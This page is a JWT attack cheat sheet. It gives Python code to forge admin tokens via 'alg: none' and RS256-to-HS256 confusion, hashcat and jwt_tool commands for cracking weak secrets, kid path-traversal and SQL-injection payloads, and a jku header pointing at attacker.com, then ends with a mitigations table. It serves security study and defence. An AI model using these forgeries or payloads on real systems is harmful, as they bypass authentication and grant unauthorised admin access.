---
title: JSON Web Tokens (JWT)
excerpt: JWT structure, common attack vectors — none alg, algorithm confusion, weak secrets, kid injection.
---

# JSON Web Tokens (JWT)

## Structure

```
header.payload.signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Each part is Base64URL encoded (no padding, `-` instead of `+`, `_` instead of `/`).

---

## Attack 1 — `alg: none`

Strip the signature entirely:

```python
import base64, json

header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).rstrip(b'=')
token   = header.decode() + '.' + payload.decode() + '.'
```

Accepted by libraries that don't explicitly disallow `none`.

---

## Attack 2 — Algorithm confusion (RS256 → HS256)

If the server uses RS256 and the public key is known, re-sign as HS256 using the public key as the HMAC secret.

```python
import jwt

public_key = open('public.pem').read()
forged = jwt.encode({"sub":"1","role":"admin"}, public_key, algorithm="HS256")
```

Works when the library trusts the `alg` header without restriction.

---

## Attack 3 — Weak secret (brute force)

```bash
# hashcat
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py <token> -C -d rockyou.txt
```

Common weak secrets: `secret`, `password`, `123456`, app name, empty string.

---

## Attack 4 — `kid` header injection

The `kid` (key ID) field is used to look up the signing key. If it's passed to a filesystem lookup or SQL query:

```json
{ "alg": "HS256", "kid": "../../dev/null" }
```

An empty file read → secret is empty string → sign with `""`.

```json
{ "alg": "HS256", "kid": "' UNION SELECT 'attacker_secret' --" }
```

SQL injection → control the signing key.

---

## Attack 5 — jwks_uri spoofing

If the server fetches the public key from a URL in the token header (`jku`, `x5u`):

```json
{ "alg": "RS256", "jku": "https://attacker.com/jwks.json" }
```

Host your own JWKS with a key pair you control.

---

## Quick decode

```bash
# Decode without verification (inspect only)
python3 -c "
import sys, base64, json
t = sys.argv[1].split('.')
for p in t[:2]:
    p += '=='
    try: print(json.loads(base64.urlsafe_b64decode(p)))
    except: pass
" <token>
```

---

## Mitigations

| Risk | Fix |
|---|---|
| `alg: none` | Explicitly whitelist allowed algorithms |
| Alg confusion | Pin algorithm: `jwt.decode(t, key, algorithms=["RS256"])` |
| Weak secret | Use 256-bit random secret for HS256 |
| `kid` injection | Validate and sanitize kid; don't use in DB queries |
| `jku`/`x5u` spoofing | Pin or whitelist JWKS URLs |
